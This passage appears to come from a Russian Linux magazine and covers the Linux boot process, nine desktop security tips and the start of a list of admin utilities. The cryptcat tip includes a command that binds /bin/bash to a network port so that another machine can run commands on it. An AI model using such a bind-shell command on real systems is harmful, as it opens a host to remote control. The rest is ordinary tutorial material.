тайм‐аута), Grub находит связанный с этим пунктом меню образ ядра Linux
на диске (обычно это файл /boot/vmlinuz), а также зак репленный за ним
образ initramfs (о нем чуть позже), заг ружает их в память и переда ет управле‐
ние ядру.





      Что бы увидеть меню Grub в Ubuntu, необ ходимо удерживать Shift




Название файла с образом ядра име ет исто рические кор ни. Изначально
образ ядра классического UNIX назывался прос то unix, но, ког да появи лась
версия ядра для процессоров с защитой памяти, чтобы избежать путаницы,
наз вание сменили на vmunix. Буква z вмес то x на конце, в свою оче редь,
означает, что образ сжат с помощью ути литы gzip (алгоритм Deﬂate, тот же,
что в классическом ZIP).



2. ЯДРО И INITRAMFS
По лучив управле ние, ядро начинает первичную ини циализацию: запус кается
под система управления памятью, настраивается обработчик пре рываний,
инициализируются необходимые для дальнейшей работы ядра структуры
данных. Когда эта работа будет закончена, ядро распаковы вает архив
initramfs (обычно он имеет имя вида /boot/initramfs‐linux.img и пред‐
став ляет собой архив cpio, сжа тый с помощью gzip) в файловую сис тему
в опе ративной памяти  (tmpfs), делает ее кор невой файловой системой
и запускает скрипт /init (в различных дистрибутивах имя может отличаться).
    Initramfs вклю чает в себя базовый набор компонен тов Linux‐дис три бути ва:
стандартные системные катало ги /bin, /lib, /etc и так далее, прос тейший
коман дный интер претатор (обычно ash), набор команд BusyBox, нес колько
вспомогательных библиотек и набор модулей ядра (драйверов), предназна‐
ченных для работы с различны ми накопи телями и файловыми системами.





                    Содержимое initramfs

Смысл существо вания initramfs в том, что бы решить проблему курицы и яйца:
загрузить драй веры для подклю чения реальной корневой фай ловой системы
до того, как она будет подклю чена. Имен но это и происходит, когда система
запускает скрипт /init. Он определяет установленные в систему накопи тели,
загружает в ядро драйверы для работы с ними, а затем под ключает нужный
раз дел нуж ного накопи теля (о том, какой имен но, ядро узнает благода ря
переданному при загрузке параметру root) к корню, перекрывая таким обра‐
зом содер жимое initramfs. Затем скрипт запускает /sbin/init, с которого
и начина ется следующий шаг заг рузки ОС.





                        Скрипт init из initramfs




Android исполь зует очень похожий прин цип заг рузки. Исключение здесь сос‐
тоит только в том, что initramfs не перекрывается реальной файловой сис‐
темой по окончании работы /init. Вместо этого нужные разделы подклю‐
чают ся уже к ней: сис темный раз дел к /system, раздел с установленными
при ложе ниями — к /data и так далее. Кроме того, ядро и initramfs здесь рас‐
полага ются не в отдельных файлах, а записаны друг за дру гом в раздел boot.



3. ПЕРВИЧНАЯ ИНИЦИАЛИЗАЦИЯ
Пос ле того как скрипт /init из initramfs заканчива ет свою работу, он запус‐
кает утилиту /sbin/init реальной фай ловой системы. С этого момента
начинается инициализация самой ОС: заг рузка необ ходимых драй веров,
под клю чение файловых систем и раз делов под качки, нас тройка сетевых
интерфейсов и запуск системных служб.
  Исторически /sbin/init была очень прос той утилитой, которая занима‐
лась  толь ко  тем,  что передавала управление определенным скриптам
в зависимос ти  от передан ного ей параметра  (скрипты располагались
в каталогах /etc/rcX.d/, где X — уровень загрузки). Каждый скрипт отвечал
за строго опре деленную операцию: один подклю чал перечисленные в файле
/etc/fstab фай ловые системы, другой конфигурировал сетевые интерфей‐
сы, еще один запус кал демон cron (он занима ется запус ком периоди чес ких
задач), еще один — демон syslog (он отве чает за прием жур нальных сооб‐
щений и их запись на диск) и так далее. Этот стиль инициализации получил
имя SystemV по имени версии UNIX, в которой он появил ся.
  Дос тоинство сти ля инициали зации SystemV в его край ней простоте: его
лег ко понять, его легко реализовать, с ним прос то работать. Однако он абсо‐
лютно не под ходит к сов ременным реалиям.
  Сегодня загрузка ОС не сводится к загрузке пары‐трой ки драй веров, под‐
ключению двух фай ловых систем, настрой ке одно го сетевого интерфей са
и запуску трех служб. Стандартная кон фигура ция может включать в себя
десятки различных демонов, на запуск каждого из которых может уйти немало
вре мени, а сам демон может упасть. SystemV запус кает службы последова‐
тель но и не контро лирует их жизненный цикл, поэто му заг рузка становит ся
медленной, а корректная работа в дальнейшем не гарантируется.
   Чтобы обой ти эти проблемы, разработчики macOS в свое вре мя создали
аль тернативу /sbin/init под названи ем launchd. Это без пре увеличения
гениальная разработка — launchd не только уме ет контролировать жиз‐
ненный цикл служб, но и запускает их лишь тог да, ког да эти службы становят‐
ся нуж ны. При чем делает это весь ма неординарным образом.
  О том, как это происходит, мы еще поговорим. Сей час в истории с launchd
нас инте ресует другое, а именно то, что под его впе чатлением был создан тот
самый systemd. Сегодня systemd — часть большинс тва дистри бутивов Linux.
Он гораздо сложнее /sbin/init и даже launchd, а в его конструкции нет
и намека на уровни запуска и скрип ты. Systemd опе риру ет понятием юнит
(unit), который может олицет ворять собой служ бу, операцию монтирования,
операцию настройки сетевого интерфейса и дру гие.





                     Конфиг юнита демона Tor

Для описания юнитов исполь зуется специальный декларативный язык, поэто‐
му допустить ошиб ку конфигура ции сложнее, чем при написании скрипта.
Юниты могут иметь зависи мости друг от друга и запускаются парал лельно
либо когда в них возникает необ ходимость. Нап ример, службы (демоны),
не зависящие от сетевого подклю чения, могут быть запущены раньше нас‐
тройки сетево го интерфейса, другие — сразу пос ле его настройки, третьи —
только тогда, когда к ним обращаются при ложе ния или другие службы.


4. ЗАПУСК ДЕМОНОВ
Запуск служб (демонов) — один из клю чевых моментов загрузки ОС. Особое
место здесь занимает демон udev, без которого типичный дис трибутив Linux
окажет ся неработос пособен.
   Udev занимается управлением содержимым катало га /dev. Как мы все
зна ем, в Linux‐сис темах этот каталог используется для хранения так называ‐
емых файлов устройств — особого типа файлов, олицетворяющих собой те
или иные компоненты ПК. Именно с помощью файлов устройств в Linux про‐
исхо дит работа с оборудованием: читаешь файл /dev/sda1 и получаешь
содержимое первого раздела пер вого жес ткого диска, записы ваешь данные
в /dev/fb0 и выводишь картинку на экран.
  В раннем UNIX каталог /dev был ста тичен. Он содер жал набор файлов
на все случаи жизни: даже если в ПК не была уста новлена зву ковая карта,
файл /dev/dsp для вывода звука все рав но существо вал. Когда количество
раз лично го обо рудования было невели ко, а plug’n’play еще не родил ся, проб‐
лем не было: все го лишь десяток‐другой файлов. Но со вре менем он все
боль ше захламлялся и в итоге превратился в помойку.
  Первый вариант решения этой проб лемы состоял в том, чтобы подключить
к /dev виртуальную файловую систему (devfs), содер жимым которой управля‐
ло бы ядро. Оно находи ло все уста новленное оборудование и соз давало
файлы только для тех устрой ств, которые реально присутс твуют в машине.
   Та кое решение до сих пор используется в macOS и FreeBSD, но разработ‐
чики Linux пош ли другим путем. Здесь есть специальная фай ловая система
sysfs, подключенная к каталогу /sys. Это нечто вро де под робной базы данных
обо всех устройствах ПК, начиная от процес сора и контроллера прерываний
и заканчивая мышками и геймпадами.





 С помощью /sys можно не только получить информацию об устройствах,
  но и управлять ими

На осно ве информации, извлеченной из /sys, демон udev создает файлы
устройств в /dev. Во время первого старта он про ходит по всем устройствам
в /sys, а затем засыпает и ждет, пока не будет добавлено или удалено
устройство: вот кнул флешку — в /sys появились новые файлы, udev прос‐
нулся и соз дал на их основе файл устройства в /dev, загрузив нужные драй‐
веры.
  Еще один важный для UNIX‐сис тем демон — syslog. Это своего рода
агре гатор логов при ложений, складыва ющий их все в каталог /var/logs.
В основанных на systemd дистри бути вах вместо него обычно используется
systemd-journald, который хранит логи в специальном бинарном формате
(syslog опе рирует тек стом). В него мож но добавлять новые записи, но уда‐
лять нельзя. Это защита от взломщиков, которые могли бы удалить нужные
строки из фай лов, чтобы скрыть сле ды своего пребывания в системе.
  В среднестатистическом дистрибути ве Linux также есть другие демоны:
 • cron — отве чает за выполнение задач по времени. Может запус кать
   команды через опре делен ные промежутки или в четко заданное время.
  Простей ший вари ант использования — создание бэкапа по ночам;
 • cups — демон печати. Следит за оче редью отправ ленных на печать
   документов и отда ет их принтеру;
 • systemd-logind — управляет поль зовательски ми сессиями, поз воляет
  быстро переключать ся между сессиями, дает разрешение на автомон‐
   тирование устройств от лица пользователя и выполняет другие задачи;
 • dbus — демон, обслу живающий работу шины данных, поз воляющей при‐
   ложениям обме ниваться информацией. В основном используется в сре‐
   дах рабочего сто ла и гра фических при ложениях;
 • NetworkManager — конфигуратор сетевых интерфейсов. Используется
   толь ко в дес ктопных вариантах дистрибутивов и может быть заменен
   на аналог. Нап ример, wicd.

В большинстве сво ем демоны обменива ются информа цией с приложениями
и другими демонами с помощью UNIX‐сокетов. Это канал ком муникации, зак‐
репленный за файлом. Например, демон cups создает сокет /var/run/cups/
cups.sock  (в  разных дис трибутивах расположение может  отличаться).
Записывая в него дан ные, можно отправлять документы на печать.
  Именно эту осо бен ность используют launchd и systemd, чтобы запускать
демоны только по мере необ ходимости. Трюк сос тоит в том, чтобы заранее
создать сокеты для всех системных демонов, а сами демоны запус кать толь ко
тог да, когда кто‐либо запишет данные в сокет; нет смысла запускать cups
при загрузке или в любой дру гой момент, если никто не отправляет задания
на печать.


5. X WINDOW SYSTEM И PAM
Пос ледний этап загрузки — запуск менеджера логина. В консоли функцию
менеджера логина выполняет связ ка утилит getty (обычно используется ее
более прод винутый вариант  agetty) и login.  Getty представляет собой
рудимент, оставшийся со времен мей нфрей мов и удаленных терминалов
(название расшифровывается как get teletype). Он выводит в терминал тек‐
стовое сообщение и затем запус кает утилиту login, которая спрашивает логин
и пароль поль зователя. Ког да поль зователь вводит корректный пароль, login
запускает от его име ни шелл, указан ный в фай ле /etc/passwd.
   Графичес кий менеджер логина называется дисплейный менед жер
(Display Manager), и в каждой гра фической сре де он свой. KDE использует
менеджер KDM, GNOME — GDM, также есть возможность исполь зовать уни‐
версальный дис плей ный менеджер, например Slim. В любом случае задача
дисплейного менед жера — вывести на экран окно зап роса име ни поль‐
зователя и пароля, а после авториза ции либо запус тить оконный менеджер
нап рямую, либо выполнить ряд команд, записанных в пользовательский файл
~/.xinitrc.





                Дисплей ный менеджер KDM в Debian

Одновре менно с запуском дисплей ного менеджера запускается графическая
система X Window System, а в современ ных дистрибутивах — Xorg. Это кли‐
ент‐серверная система вывода графики на экран, где сер вер отве чает
за компонов ку общей картинки, сфор мированной различны ми приложе‐
ниями‐кли ентами. X Window System — не гра фическая среда, а лишь прос‐
лойка, поз воля ющая при ложениям отправлять картинку на экран и получать
события ввода от пользователя. Что бы построить на ее основе графичес кий
интерфейс, также нужен ме нед жер окон (window manager), который поз‐
волит пользовате лю управлять окнами приложений.
  Ме неджер окон может работать как обо соб ленно (например, ﬂuxbox, win‐
dow maker, i3), так и в составе комплексной сре ды рабочего стола (KDE,
GNOME, XFCE). Кроме менеджера окон, они также включают в себя набор
средств для фор мирования полноцен ного десктопа: панель задач в нижней
или вер хней части экрана, док, систему расположения ико нок на рабочем
столе и прочее. Обычно каж дый из этих элемен тов управляется одним
или несколь кими специальными приложениями.
  Незави симо от того, какой способ входа исполь зует юзер, за контроль
доступа всегда отвечает PAM. Это модульная система аутентифика ции поль‐
зователя, которая может проверять его личность самыми разными способа‐
ми, попутно выпол няя ряд проверок. По умолчанию PAM использует аутен‐
тификацию исключитель но с помощью пароля, но, поменяв конфигурацион‐
ные файлы /etc/pam.d, порядок аутен тифика ции можно изменить, добавив
к нему, нап ример, необходимость при ложить палец к ска неру отпечатков,
вста вить специаль ную флеш ку‐ключ и даже исполь зовать подтвержде ние
с помощью смартфона. О том, как это сделать, мы уже писали.





              Конфигурацион ный файл PAM ути литы login

На этом процесс заг рузки мож но считать законченным. Ты либо выполняешь
логин в кон соль и видишь приглашение командно го интерпре татора либо
вводишь данные учетной записи в окно дисплей ного менеджера, и в резуль‐
тате на экра не появ ляется рабочий стол.


ВМЕСТО ЗАКЛЮЧЕНИЯ
Так выг лядит загрузка современного дис трибути ва Linux. Некоторые не особо
важ ные и не особо интерес ные детали я опус тил, но попытал ся рас сказать
о самом главном. Если вдуматься, это не такой уж и сложный процесс, фак‐
тически опе раци онная система готова при нимать команды пользователя уже
на этапе подключения initramfs, все остальное — запуск окружения, которое
необходимо для полноцен ной работы пользователя.
UNIXOID





                                       Илья Остапенко
                                            ostapenko.public@gmail.com


          9 ПРОСТЫХ ТРЮКОВ,
      КОТОРЫЕ СДЕЛАЮТ ЖИЗНЬ
      ЛИНУКСОИДА СЕКЬЮРНЕЕ



Жизнь обыч ных людей скла дывается из мелочей. Жизнь
линуксоида складывается из мно жества маленьких полез ных
трюков, накапливаемых за годы работы в системе. Ценность
таких трю ков многим выше, если они не только удобны
в использовании, но и спо собны повысить информационную
безопасность.  Несколь ко  прос тых  хинтов,  описанных
в статье, могут пополнить закрома даже гиков, не говоря уже
о том, что бы стать хорошим стартом для новичков.


ОТКЛЮЧЕНИЕ КАМЕРЫ
Скотч на веб‐камере лаптопа уже давно стал притчей во языцех нас толь ко,
что ушлые ком мерсанты начали предлагать различные прис пособления, пре‐
вос ходящие по своей эстетике кусок изоленты. Поэтому, даже если Большого
Брата в твоем случае ожидает лишь изоб ражение красногла зого чувака
на фоне кирпичной стены, который сутками напролет пялится в экран, воп‐
росами безопасности все же сто ит озаботиться. Но тратить ся на лей коп‐
ластырь — не наш метод, ведь Linux дает возможность запретить загрузку
отдельных модулей ядра.
  С помощью mkinitcpio ‐M можно определить название модуля камеры
и поместить его в черный список. Для этого дос таточно отредактировать
файл /etc/modprobe.d/camera.conf, добавив такую стро ку:


blacklist uvcvideo

Ес ли твоя паранойя выше сред него уровня и ты опасаешься, что камеру
включит другой не запрещен ный в системе модуль или ты собс твенноручно
загрузишь в сос тоянии сомнамбуличес кого транса, можешь пригвоздить его
намертво в том же файле строкой:


install uvcvideo /bin/false

Это, конеч но же, не спасет тебя от взлом щика, который сможет получить пра‐
ва  root и будет достаточно сообразителен,  чтобы догадаться, почему
не работа ет камера. Но в этом случае твои обнаженные фотографии — пос‐
леднее, о чем тебе стоит беспоко иться.


УДАЛЕНИЕ КОРЗИНЫ
Как и любое ведро с мусором в реальной жиз ни, содержимое корзины компь‐
ютера может многое рас сказать о сво ем владельце. Поэтому складывать
в нее то, что тебе дей ствитель но не нуж но, не толь ко бессмысленно, но и
небезо пасно. Лучше уда лять весь хлам раз и навсегда пол ностью.
   Если в твоей системе отсутству ет возможность удалять фай лы, минуя кор‐
зину, а сам  ты, как солидный человек, привык при нимать взвешенные
решения и не любишь двой ную работу, то для тебя есть универсальный спо‐
соб, который прос то не поз волит приложениям помещать файлы в корзину
и заставит их удалять файлы навсегда абсо лютно во всех слу чаях.
  Для этого дос таточно все го лишь удалить каталог ~/.local/share/Trash
и создать на его месте пустой файл:


$ rm ‐rf ~/.local/share/Trash
$ touch ~/.local/share/Trash

Пос ле это го любая современ ная сре да рабочего стола или приложе ние
при попытке переместить удаляемый файл в корзину или даже создать саму
корзину получит ошиб ку и им не останется ничего, кроме как удалить его
с жесткого диска.


ПЕРЕНОС ДОМАШНЕГО КАТАЛОГА НА ФЛЕШКУ
О выделе нии отдельного раздела на жестком диске под домашний каталог ты
наверняка знаешь и уже не раз менял дистри бутивы, оставаясь при своих
нас тройках и с любимым сборником элек тронной музыки. Но некоторые
могут хранить в домашнем катало ге неч то поважнее песенок и постоянно
переживать, не уволок ли кто жесткий диск на анализ, пока хозяина не было
дома.
  Мож но, конечно, зашиф ровать раздел, а можно при купить флешку пообъ‐
емнее и поместить домаш ний каталог на ней, решив попутно проблему
не толь ко сох ранности данных, но и их дос тупнос ти в критичес кой ситу‐
ации, — актуально, когда ты не доверяешь облачным сер висам, а товарищ
майор уже изъял компьютер на экспер тизу.
  Флешку нуж но предваритель но отформатировать в ext4, затем с помощью
коман ды blkid выяснить ее UUID (в примере использует ся cbfb14ea‐38ce‐
4a5c‐b00b‐542b9763038e) и внести в /etc/fstab в строку, монтирующую
домаш ний раздел пользователя username:


UUID=cbfb14ea‐38ce‐4a5c‐b00b‐542b9763038e /home/username ext4
defaults 0 0

Разуме ется, отключать и под ключать флеш ку необходимо только после
отклю чения питания компа. Но даже если ты выдернешь ее прямо во вре мя
работы, ничего страшного не произой дет — при сле дующей загрузке Linux
про верит ее на наличие ошибок, и все файлы останутся в сохранности (кро ме
тех, которые ты копировал в момент извлечения флешки, конечно).


ФЛЕШКА — КЛЮЧ АУТЕНТИФИКАЦИИ
Надежную защиту тво их данных может дать только шифрование в сочета нии
с надежным паролем. Но, как мы все знаем, длинный, сложный пароль —
это долго и слишком нудно. Его придет ся вво дить при каждой разблокировке
экрана, воз можно на виду у других людей, которые не прочь под смот реть
за тво ими нажатиями клавиш и даже записать их на видео.
   Чтобы не вый ти из себя, в сотый раз набирая свой надежный пароль, дос‐
таточно начать использовать в качес тве клю ча аутентификации обычный USB‐
накопитель. Сде лать это можно с помощью PAM‐модуля pam_usb.
  Нес мотря на то что разработка ведется от случая к случаю и последний
ста бильный релиз 0.5.0 датирован далеким 2011 годом, инстру мент вполне
жизнеспособен.  А  если  учесть  миниатюр ные  размеры  современных
флеш‐карт, еще и эсте тичен.
  Энтузи асты могут попробовать собрать вручную  git‐версию  утилиты,
в которой добав лена поддер жка SD‐карт (одна ко их работа не всегда гаран‐
тирована), или обратить ся к форкам, созданным неравнодуш ными поль‐
зователями, с различными дополнительными плюшками (например, под дер‐
жкой udisks2).
  Для настройки USB‐ключа необходимо:
 1. Выбрать носитель и задать ему имя (например, FLASHKEY):


   $ sudo pamusb‐conf ‐‐add‐device FLASHKEY

 2. До бавить пользователя, зарегистрирован ного в сис теме, который будет
   авторизоваться с помощью флешки (нап ример, username):


   $ sudo pamusb‐conf ‐‐add‐user username

 3. Проверить корректность уста новок:


   $ sudo pamusb‐check username

 4. Включить pam_usb в процесс авториза ции, добавив в начало /etc/pam.d/
   system‐auth строку:


   auth sufficient pam_usb.so

Эта стро ка указыва ет сис теме, что встав ленной флешки достаточно для авто‐
ризации. Если ее вынуть, система снова ста нет зап рашивать пароль поль‐
зователя.





             Настрой ка авторизации с помощью флешки

Для авто ризации рута благоразум нее иметь отдель ную флеш ку и вставлять
ее в разъем, когда понадобится повысить при вилегии в системе с помощью
su или sudo. В этом слу чае стро ку из пункта 4 следует добавить в /etc/pam.
d/su.


ДВУХФАКТОРНАЯ АУТЕНТИФИКАЦИЯ
Об легчив себе аутентификацию при непосредственной работе за компь юте‐
ром, сто ило бы максимально усложнить ее для уда ленного доступа. Нап‐
ример, когда это доступ по SSH. В таком случае тебя выручит модуль pam‐
google‐authenticator, с помощью которого мож но настроить двухфакторную
аутентификацию на осно ве одноразо вых паролей.
  Сперва необходимо  установить на компьютер сам  пакет. Под тем
или иным названи ем он доступен во всех популярных дистрибутивах. Поиск
следует вести по клю чевым словам pam google.
   Установив пакет, нуж но отредактировать файл /etc/pam.d/sshd, добавив
в него строку


auth required pam_google_authenticator.so no_increment_hotp

Оп ция no_increment_hotp зап ретит счетчику неудачных попыток авто риза‐
ции увеличи вать их количес тво.
   Те перь осталось настроить сам модуль, выполнив команду


$ google‐authenticator

В ходе ее выпол нения будет сгенерирова на ссылка на QR‐код для привязки
телефона (ее сле дует отсканировать с помощью при ложения Google Authenti‐
cator), секретный ключ для ввода в телефо не вручную, один текущий код дос‐
тупа и пять резервных. На все вопросы (привязка кода к линейке вре мени,
обновле ние настроек прог раммы в папке поль зователя, запрет повторного
использования одно го и того же кода, огра ничение в виде трех попыток входа
в 30‐секундный промежу ток времени) следует ответить утверди тельно и лишь
на один — четвертый по счету (уве личение вре менного рас хождения между
клиентом и сер вером) — из соображений безопасности лучше ответить отри‐
цатель но.




                     Дан ный метод аутен тифика ции, несмотря на свое
                       название, никак не свя зан с Google или его сер‐
                       верами. Вместо Google Authenticator ты можешь
                       использовать приложение от независимых раз‐
                       работчиков — FreeOTP.



КЛЕТКА ДЛЯ СОФТА
Даже надеж но защищенная крепость не обхо дится без обще ния с внешним
миром. Запуск программ сомнительного поведения может свес ти на нет все
усилия по обеспечению безопасности. В этом слу чае пригодится инструмент,
позволя ющий настро ить исполнение приложений в рам ках жестко ограничен‐
ного прос транства (песочнице).
   Та кой инструмент есть, и название у него соответствующее —  Firejail.
Программа лаконична и проста в использовании в сравнении с прочими
средства ми схожей функци ональнос ти. Исполь зование программы в гра‐
фичес ком режиме воз можно с помощью незатей ливого Qt‐фронтенда Fire‐
tools. Впрочем, и консоль ный вари ант не вызовет затруднений.





             Окно настройки Firejail с помощью Firetools

Нап ример, запустить нужное приложение (Chromium) в изолированном кон‐
тей нере с зап ретом доступа к критичес ким каталогам, системным вызовам
и в приватном режиме мож но коман дой


$ firejail ‐‐seccomp ‐‐private chromium

В этом случае все файлы, соз данные браузером, удалятся, как только он
будет закрыт. Но дос туп ко всему домаш нему катало гу пользователя останет‐
ся откры тым. Что бы полностью отрезать запускаемое при ложе ние от фай‐
ловой системы, пот ребуется выполнить ряд шагов по нас тройке, а именно —
создать поль зовательский каталог для фай лов конфигурации и каталог запус‐
ка для при ложе ния (ту самую тюрьму):


$ mkdir ~/.config/firejail
$ mkdir ~/chromium

Далее сле дует ско пировать конфигурационный файл песоч ницы в домашний
каталог:


$ cp /etc/firejail/chromium.profile ~/.config/firejail

и отре дак тировать его, добавив параметр приватности:


$ echo "private ${HOME}/chromium" >> ~/.config/firejail/chromium.
profile

Что бы по умолчанию приложение запускалось в подготов ленной таким обра‐
зом «тюрьме», нужно выполнить от рута


# echo "firejail ‐‐seccomp /usr/bin/chromium $@" > /usr/local/bin/
chromium
# chmod +x /usr/local/bin/chromium


ОТКЛЮЧЕНИЕ ФОНОВЫХ СЛУЖБ В CHROME
Сов ременные веб‐при ложения сложны, многофункциональны и во многих
слу чаях пре вос ходят свои десктоп ные аналоги. Но у них есть одна проблема:
ты зак рываешь вклад ку, и приложение перес тает работать. Что бы решить эту
проблему, разработчики Chrome при дума ли штуку под наз ванием Service
Worker. Это API, который позволяет заг рузить в бра узер код и вызывать его
позже даже в том случае, если само веб‐приложение закрыто.
  Основное назначение Service Worker — обра ботка push‐уведом лений, но,
как это обычно бывает, технология может быть исполь зована и для несколько
других  и, ска жем  так, не совсем полез ных поль зовате лю дей ствий. C
помощью Service Worker можно создать код, который будет неп рерывно
работать в фоне и грузить про цессор, либо написать троян и организо вать
браузе ры в бот нет.
  По умолчанию браузер не поз воляет отклю чить Service Worker, однако мы
можем применить неболь шой трюк и прос то уда лить каталог хранения скрип‐
тов и создать на его мес те пустой файл (если ты исполь зуешь Chromium,
замени chrome на chromium):


$ cd .config/chrome/Default
$ rm ‐rf "Service Worker"
$ touch "Service Worker"

Принцип здесь ров но тот же, что и в случае с кор зиной. Не обнаружив каталог
хранения скриптов, браузер попытается его создать, но этому помешает
наличие файла с тем же име нем.


УСКОРЕННАЯ ТОРИФИКАЦИЯ
Об использовании сети Tor в последнее время слыш но из каждого утюга.
Поэтому неуди вительно, что для многих ее исполь зование давно ста ло рутин‐
ным процессом, причем не только в случае сер финга с помощью браузера.
   Чтобы обеспечить быстрый дос туп к сервису Tor любым программам
без необходимости настрой ки их каж дой в отдельности, можно использовать
утилиту torify из комплекта Tor. С ее помощью можно прозрачно свя зать нуж‐
ное приложе ние и библиотеку tsocks, содер жащую необходимые для прок‐
сирования конфигура цион ные файлы. Использовать ее проще простого:


$ torify wget ‐qO‐ https://check.torproject.org/ | grep ‐i congra
tulations

Следует заметить, что резолвинг DNS в этом случае будет осуществляться
обычным образом, не через Tordns. Это можно испра вить, при менив утититу
tor‐resolv, которая возвращает IP переданного доменного име ни. Пример
откры тия страницы с помощью консоль ного браузе ра elinks:


$ torify elinks $(tor‐resolve checkip.dyndns.org)


КРИПТОГРАФИЧЕСКИЙ NETCAT
Трюками с использовани ем гиковского швейцар ского ножа netcat в качес тве
утилиты для быстрой переда чи файла меж ду компь ютерами в сети уже давно
никого не уди вишь. Инстру мент старый, и спо собов нетривиально его при‐
менить изобретено множес тво. Единственным сла бым местом остается
отсутс твие в netcat какой‐либо защиты от ком промета ции со стороны третьих
лиц.
   Ути лита cryptcat лишена этого недос татка. Она использует шиф рование
по алго ритму Twoﬁsh. Ключ шифрования по умол чанию — metallica, поэтому
сра зу после установ ки его следует изме нить с помощью ключа ‐k (для при‐
мера пусть будет apocalyptica):


$ cryptcat ‐k apocalyptica

В остальном логика работы и семантика команд такая же, как и в netcat:


$ cryptcat ‐lp 1234 # машина‐получатель
$ cryptcat <IP адресата> 1234  # машина‐отправитель

Представ ленные выше команды поз воляют организовать защищенный чат
между двумя машинами. Введен ный в тер минале любой из машин текст отоб‐
разится и в терминале другой машины.
  До пол нив cryptcat клю чом запуска внеш него приложения на устройстве
адресата, можно запускать на ней коман дную оболочку и обес печить выпол‐
нение команд с удаленной машины:


$ cryptcat ‐lp 1234 ‐e /bin/bash # машина‐адресат
$ cryptcat <IP адресата> 1234 # машина‐манипулятор

Ко ман ды будут выпол нять ся на машине‐адресате, а вывод команд появится
в том чис ле и в окне терминала машины‐манипу лятора.
  Потоковая переда ча видеофайла с машины‐тран слятора и его просмотр
с помощью про игрывателя mplayer на машине‐наблюдателе:


$ cat video.avi | cryptcat ‐lp 1234 # машина‐транслятор
$ cryptcat <IP адресата> 1234 | mplayer ‐vo x11 ‐cache 3000 ‐ #
машина‐наблюдатель

Отправ ка файлов (куда ж без них):


$ cryptcat ‐lp 1234 > my.jpg # машина‐получатель
$ cryptcat <IP адресата> 1234 < my.jpg # машина‐отправитель


ВЫВОДЫ
Возможно, некото рые опи санные в статье трю ки тебе покажутся слишком
при митив ными, другие бесполезными, а третьи бредовыми. Тем не менее
в чемоданчике каждого ува жающе го себя линуксоида должен быть набор
инструментов на раз ные случаи жизни. Не нуж но сей час — возможно, при‐
годится в будущем.
SYNACK





               13 УТИЛИТ,
     О КОТОРЫХ ДОЛЖЕН ЗНАТЬ
          КАЖДЫЙ АДМИН





Чемоданчик инструментов — вот что отли‐
чает опыт ного специалиста от нович ка. А в
вопросах, связанных с администрирова‐
нием Linux, такой чемодан чик — едва ли
не  самое  важное. В  этой  статье мы          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
не будем говорить о таких вещах, как Na‐              zobnin@glc.ru
gios, Puppet, Webmin, или изощренных ана‐
лизаторах логов Apache — обо всем этом
ты должен знать и так. Вмес то это го мы
поговорим о небольших утилитах, спо соб‐
ных сде лать твою жизнь намного про ще.


TMUX
Нач нем c основы основ. Как мы все зна ем, главный инструмент адми нистри‐
рования Linux — это SSH‐клиент, либо из комплекта OpenSSH, либо обо соб‐
ленный, вроде PuTTY или даже приложения для Android. SSH‐клиент поз воля‐
ет открыть удаленную сессию коман дной стро ки и спо койно работать
с машиной, которая находится за тысячи километ ров от тебя. Проблема толь‐
ко в том, что это одна сессия и она не запоминает состояние.
   Tmux решает проблему. Это терминальный мультиплексор, который поз‐
воля ет открыть мно жество тер миналов в рамках одной SSH‐сессии с воз‐
можностью закрыть соединение, сохранив сос тояние.
  Работает это так. Ты подклю чаешь ся к уда лен ной машине с помощью SSH,
затем устанав ливаешь на нее tmux и запус каешь его. На экране появ ляется
консоль tmux со стро кой состояния вни зу и одним запущенным в данный
момент тер миналом. Ты можешь работать с ним так же, как обычно, плюс
у тебя есть возможность откры вать новые тер миналы с помощью Ctrl+b c
и переключаться между ними с помощью Ctrl+b 0..9 или Ctrl+b p (предыду‐
щий), Ctrl+b n (следующий).
   Когда работа будет окон чена, нажимаешь Ctrl+b d, чтобы отключиться
от tmux, и разрываешь соединение с сервером. При следующем подклю‐
чении ты выполняешь команду


$ tmux attach

и видишь все откры тые ранее терминалы, запущенные в них приложения,
исто рию команд и так далее. Все ровно так, как во время отключения от tmux.
Более того, абсолют но неважно, с какой машины ты зашел во второй раз,
сессия tmux будет полностью вос становлена.


TMUXINATOR
Tmux позволяет не толь ко открывать терминальные окна в полный экран. Он
уме ет делить экран по вертикали  (Ctrl+b % ) и горизонтали  (Ctrl+b ").
Это можно исполь зовать в том числе для соз дания чего‐то наподобие «экра‐
на мониторин га»: например, ты можешь запус тить на удаленной машине tmux
с тремя открытыми окнами, в одном из которых будет монитор htop, в дру‐
гом — ути лита tail, выводящая последние сооб щения из нужного лога, а еще
в одном — ути лита df, показы вающая запол ненность файловых систем.
  На пер вый взгляд такой монитор кажется очень удобным, но что, если тебе
необходимо закрыть его и запустить tmux с обычными полноэк ранны ми окна‐
ми, а затем сно ва открыть монитор? Это мож но реализовать с помощью нес‐
кольких различных tmux‐сес сий. Но это тоже не идеаль ный вари ант, потому
что на другом сервере тебе при дется нас траивать ту же конфигурацию окон
заново.
   Tmuxinator решает задачу про ще. Он поз воляет описать нужную рас клад ку
окон и запускаемые в них приложения в кон фигура ционном файле. Этот кон‐
фиг затем можно исполь зовать для быс трого запус ка сес сии tmux в любом
месте в любое время.
  Для начала создай новый конфиг:


$ tmuxinator new ИМЯ

Tmuxinator  откро ет  дефолтовый   тексто вый  редактор,  определенный
в переменной EDITOR. В кон це конфига будут стро ки, опи сывающие расклад‐
ку окон. Что бы получить расклад ку из примера выше, удали их и добавь сле‐
дующие строки:


windows:
    ‐ editor:
        layout: tiled
        panes:
            ‐ sudo tail ‐f /var/log/vsftpd.log
            ‐ watch df ‐h
            ‐ htop

Этот кон фиг опи сывает рас кладку tmux с одним окном, поделенным на три
панели: последние сообщения лога vsftpd, запол ненность ФС и htop. Оста‐
ется толь ко запустить сессию:


$ tmuxinator start ИМЯ





Все конфиги хранятся в катало ге ~/.tmuxinator, поэтому их легко переме‐
щать между машинами.


WATCH
Ты мог заметить, что в конфиге tmuxinator я использовал команду watch df ‐
h вместо df ‐h. Это важно, так как сразу после вывода таблицы разделов
на экран df завер шает свою работу, а нам необ ходимо мониторить сос‐
тояние диска постоянно. Именно это и позволяет сде лать утилита watch. Каж‐
дые две секунды она переза пускает команду df ‐h, поэтому информация
на экра не всегда актуальна.
   Watch можно использовать для монито рин га практичес ки чего угодно:
состояния машины (watch uptime), содер жимого фай лов (watch cat файл)
и катало гов  (watch  ls  ‐l  каталог), можно запускать под управлением
watch собственные скрип ты. С помощью опции ‐n ЧИСЛО ты можешь изме‐
